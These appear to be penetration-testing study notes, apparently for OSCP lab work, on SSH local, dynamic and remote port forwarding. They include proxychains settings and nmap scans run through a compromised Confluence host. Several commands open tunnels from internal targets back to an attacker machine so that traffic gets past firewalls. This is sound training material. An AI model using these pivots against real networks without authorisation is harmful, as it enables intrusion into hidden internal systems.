
## Global note: make sure a full TTY is enabled before using `OpenSSH`.
### Local port forwarding

``` 
ssh -N -L 0.0.0.0:4455:172.16.217.217:445 database_admin@10.4.217.215           // on 192.168.217.63
// Open port 4455 on 192.168.217.63, sending the packets through 172.16.217.217 to 10.4.217.215:445.
```
`-N`: spawn no shell, give no output.



### Dynamic port forwarding
When dynamic port forwarding, all ports on the target machine are forwarded. To achieve this, a SOCKS5 proxy to a specific IP is used:

```
ssh -N -D 0.0.0.0:9999 USERNAME@HIDDEN_MACHINE           // Run from the remote machine
// change "socks5 127.0.0.1 1080" to "socks5 REMOTE_IP 9999" in /etc/proxychains.conf locally
proxychains nmap -n -sT --top-port=10 HIDDEN_MACHINE_REACHABLE_IP        // make sure to use '-n' and '-sT'
```
Note: make sure to use `proxychains` before every network command.
###### Example output
```
confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -D 0.0.0.0:9999 database_admin@10.4.217.215
Could not create directory '/home/confluence/.ssh'.
The authenticity of host '10.4.217.215 (10.4.217.215)' can't be established.
ECDSA key fingerprint is SHA256:GMUxFQSTWYtQRwUc9UvG2+8toeDPtRv3sjPyMfmrOH4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
database_admin@10.4.217.215's password: 


┌─[root@edu-virtualbox]─[/tmp/oscp]
└──╼ #tail /etc/proxychains.conf 
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks5 127.0.0.1 5000
#socks5  127.0.0.1 1080
socks5  192.168.217.63 9999
// sets the target machine (running the port forwarder) and IP.

┌─[✗]─[root@edu-virtualbox]─[/tmp/oscp]
└──╼ #proxychains nmap -sT -n --top-port=10 -Pn 172.16.217.217
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-06 00:57 CEST
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Host is up (10s latency).

PORT     STATE  SERVICE
21/tcp   closed ftp
22/tcp   closed ssh
23/tcp   closed telnet
25/tcp   closed smtp
80/tcp   closed http
110/tcp  closed pop3
139/tcp  open   netbios-ssn
443/tcp  closed https
445/tcp  open   microsoft-ds
3389/tcp open   ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 105.67 seconds


```



### Remote port forwarding
When there is a firewall involved, nearly any inbound connections can be blocked. Usually, outbound connections are allowed though.
Remote port forwards work nearly the same as Local port forwards, but the SSH connection has the remote host as the "sender", while taking the attacking machine as the "reciever". This way, the traffic will be marked as outbound to the firewall.
This system works very similarly to a reverse shell, and is usually implemented when the attacker found credentials for a hidden host, but cannot connect to it because of the firewall.

```
ssh -N -R 127.0.0.1:ATTACKER_LOCAL_PORT:HIDDEN_TARGET_IP:HIDDEN_TARGET_PORT ATTACKER_USERNAME@ATTACKER_IP
```

Note: make sure the local SSH server is open and `PasswordAuthentication` is set to `yes` in `/etc/ssh/sshd_config`, and `OpenSSH` is started using `systemctl start ssh` or `systemctl restart ssh`.


```
ssh -N -R 127.0.0.1:5555:10.4.171.215:4444 edu@192.168.45.194
// Opens port 5555 locally on the attacking machine, connecting to 10.4.171.215:4444
```


### Dynamic remote port forwarding
```
ssh -N -R ATTACKER_LOCAL_PORT ATTACKER_USER@ATTACKER_IP           // Run from the remote machine
// change "socks5 REMOTE_IP PORT" to "socks5 LOCAL_IP LOCAL_PORT" in /etc/proxychains.conf locally
proxychains nmap -n -sT --top-port=10 HIDDEN_MACHINE_REACHABLE_IP        // make sure to use '-n' and '-sT'
```


##### Example output
```
┌─[root@edu-virtualbox]─[/tmp/oscp]
└──╼ #tail /etc/proxychains.conf 
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5  127.0.0.1 9999 
#socks5  127.0.0.1 1080
#socks5  192.168.217.63 9999


confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -R 9999 edu@192.168.45.194
Could not create directory '/home/confluence/.ssh'.
The authenticity of host '192.168.45.194 (192.168.45.194)' can't be established.
ECDSA key fingerprint is SHA256:UzBB/awDwktsNC1uQJZAZnCicwPwXQEYR2XQrvh5ojE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).

┌─[✗]─[root@edu-virtualbox]─[/tmp]
└──╼ #proxychains nmap -sT -n -p9000-9100 -Pn 10.4.171.64 -T4 -vvv
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-06 17:04 CEST
Scanning 10.4.171.64 [101 ports]
adjust_timeouts2: packet supposedly had rtt of 15090506 microseconds.  Ignoring time.                                                                                                                                   
Connect Scan Timing: About 2.97% done; ETC: 17:30 (0:24:30 remaining)
adjust_timeouts2: packet supposedly had rtt of 15089824 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of 15089824 microseconds.  Ignoring time.
Discovered open port 9062/tcp on 10.4.171.64
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Connect Scan Timing: About 8.91% done; ETC: 17:27 (0:20:37 remaining)
adjust_timeouts2: packet supposedly had rtt of 15132217 microseconds.  Ignoring time.

```




### Windows - SSH.exe
On windows, the command to check for other subnets is `ipconfig`

```
where ssh

ssh.exe -V
// If it's above version 7.6, dynamic remote port forwarding can be used.
```

```
C:\Users\rdp_admin>where ssh
C:\Windows\System32\OpenSSH\ssh.exe
```